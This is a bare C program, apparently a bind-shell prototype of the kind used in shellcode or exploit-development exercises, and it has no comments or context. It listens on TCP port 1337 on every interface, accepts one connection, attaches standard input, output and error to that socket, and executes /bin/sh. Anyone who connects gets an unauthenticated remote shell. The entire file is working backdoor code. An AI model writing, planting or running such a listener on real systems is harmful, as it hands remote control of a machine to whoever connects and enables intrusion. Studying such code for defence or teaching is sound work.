#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#define PORT_NUM 1337
#define BACKLOG 0

void error(char *msg) {
	perror(msg);
	exit(1);
}

int main(void) {
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in server_addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = INADDR_ANY,
		.sin_port = htons(PORT_NUM)
	};

	int bindRtn = bind(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr));

	if (bindRtn < 0) {
		error("ERROR binding to socket");
	}

	int listenRtn = listen(sockfd, BACKLOG);
	if (listenRtn < 0) {
		error("ERROR listening on socket");
	}

	int newsockfd = accept(sockfd, NULL, NULL);
	if (newsockfd < 0) {
		error("ERROR accepting connection");
	}

	int i;
	for (i = 0; i < 3; i++) {
		dup2(newsockfd, i);
	}

	execve("/bin/sh", NULL, NULL);

	return 0;
}
